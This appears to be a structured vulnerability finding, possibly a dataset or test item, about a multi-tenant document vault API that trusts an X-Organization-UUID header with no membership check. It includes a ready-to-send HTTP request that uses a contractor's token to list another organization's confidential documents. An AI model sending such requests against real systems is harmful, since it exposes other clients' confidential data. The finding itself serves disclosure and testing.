diagnosis: The document vault index endpoint retrieves the PostgreSQL pool corresponding to the X-Organization-UUID header and queries the document index without validating that the authenticated session user belongs to that organization. Any user can enumerate confidential document titles, file hashes, and classifications across client organizations.
exploit_request:
GET /api/vault/documents/index HTTP/1.1
Host: vault.enterprise.internal:9108
Authorization: Bearer <unauthorized_contractor_jwt>
X-Organization-UUID: b2c3d4e5-f6a7-4b8c-9d0e-1f2a3b4c5d6e
Accept: application/json
